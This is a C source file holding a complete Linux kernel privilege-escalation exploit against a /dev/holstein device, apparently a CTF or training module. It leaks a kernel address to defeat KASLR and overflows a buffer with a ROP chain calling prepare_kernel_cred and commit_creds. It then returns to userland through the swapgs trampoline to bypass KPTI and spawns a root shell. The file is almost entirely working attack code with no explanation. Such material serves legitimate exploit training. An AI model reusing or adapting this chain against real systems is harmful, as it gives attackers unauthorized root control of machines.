#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

/* ROPchain with kernel address leak and kPTI enabled. */
unsigned long int user_rip, user_cs, user_rflags, user_rsp, user_ss;

static void shell() {
  puts("### ROOT SHELL ###");
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  execve("/bin/sh", argv, envp);
}

void save_user_state(){
	asm(
	"movq %%cs, %0\n\t"		
	"movq %%ss, %1\n\t"		
	"movq %%rsp, %2\n\t"
	"pushfq\n\t"	
	"popq %3\n\t" : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp), "=r" (user_rflags) : : "memory");

	printf("State of the userland registers\n\
	\rCS - %ld\n\
	\rSS - %ld\n\
	\rRSP - %ld\n\
	\rRFLAGS - %ld\n", user_cs, user_ss, user_rsp, user_rflags);
};

int main(void){

	save_user_state();

	printf("Running the program...\n");
	int fd = open("/dev/holstein", O_RDWR);

	/* prepare memory leak payload */
	unsigned long payload[130];
        memset(payload, 'B', 20);
        read(fd, payload, 0x410);

	/* resolving kernel base address  */
        unsigned long k_base = payload[129] - 0x13d33c;
	printf("Leak %lx\n KernelBase %lx\n", payload[129], k_base);

	/* gadgets to perform ROP */
	unsigned long buff[145];
	unsigned long g_pop_rdi_ret = k_base + 0x27bbdc;
	unsigned long g_pop_rcx_ret = k_base + 0x2ea083; //       POP RCX RET
	unsigned long g_prepare_kernel_cred = k_base + 0x06e240;
	unsigned long g_mov_rdi_rax_ret = k_base + 0x60c96b;
	unsigned long commit_cred = k_base + 0x06e390;
	unsigned long swapgs_restore_regs_and_return_to_usermode = k_base + 0x800e26;

	buff[129] = g_pop_rdi_ret;
	buff[130] = 0;
	buff[131] = g_prepare_kernel_cred;
	buff[132] = g_pop_rcx_ret;
	buff[133] = 0;
	buff[134] = g_mov_rdi_rax_ret;
	buff[135] = commit_cred;
	buff[136] = swapgs_restore_regs_and_return_to_usermode; 
	buff[137] = 0x41414141;
	buff[138] = 0x41414141;
	buff[139] = (unsigned long)&shell;
	buff[140] = user_cs;
	buff[141] = user_rflags;
	buff[142] = user_rsp;
	buff[143] = user_ss;

	/* send ROPchain */
	write(fd, buff, sizeof(buff));

	close(fd);
		
	return 0;
}

